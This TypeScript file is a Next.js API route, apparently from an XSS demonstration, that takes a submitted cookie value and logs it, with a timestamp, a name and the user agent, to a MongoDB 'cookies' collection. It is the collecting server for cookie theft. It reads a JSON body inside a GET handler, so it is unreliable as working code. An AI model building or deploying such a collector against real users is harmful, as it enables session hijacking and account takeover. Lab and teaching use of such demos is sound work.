import clientPromise from "../../../../lib/mongodb";
import { NextResponse } from "next/server";

export async function GET(req: Request) {
  try {
    const body = await req.json();

    if (!body?.cookie) {
      return NextResponse.json(
        { error: "Missing cookie" },
        { status: 400 }
      );
    }

    const client = await clientPromise;
    const db = client.db("xss-demo");

    const entry = {
      time: new Date(),
      name: body.name || "unknown",
      cookie: body.cookie,
      userAgent: req.headers.get("user-agent"),
    };

    await db.collection("cookies").insertOne(entry);

    return NextResponse.json({ success: true });
  } catch (err) {
    return NextResponse.json(
      { error: "Failed to store cookie" },
      { status: 500 }
    );
  }
}